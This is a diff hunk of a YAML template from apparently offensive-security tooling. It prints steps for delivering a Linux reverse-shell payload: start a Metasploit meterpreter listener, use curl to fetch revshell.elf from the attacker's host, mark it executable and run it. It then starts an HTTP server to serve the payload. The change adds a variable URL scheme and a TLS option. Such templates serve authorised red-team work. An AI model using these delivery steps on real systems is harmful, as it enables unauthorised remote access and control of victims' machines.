@@ -14,8 +14,8 @@ content: |
   printf '%s\n' '1. Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                       -----Linux------                         '; \
-  printf '%s\n' '2. Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.elf -o {{ delivery_path_linux }}/revshell.elf'; \
+  printf '%s\n' '2. Deliver: curl {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.elf -o {{ delivery_path_linux }}/revshell.elf'; \
   printf '%s\n' '3. Make executable: chmod +x {{ delivery_path_linux }}/revshell.elf'; \
   printf '%s\n' '4. Execute: {{ delivery_path_linux }}/revshell.elf'; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
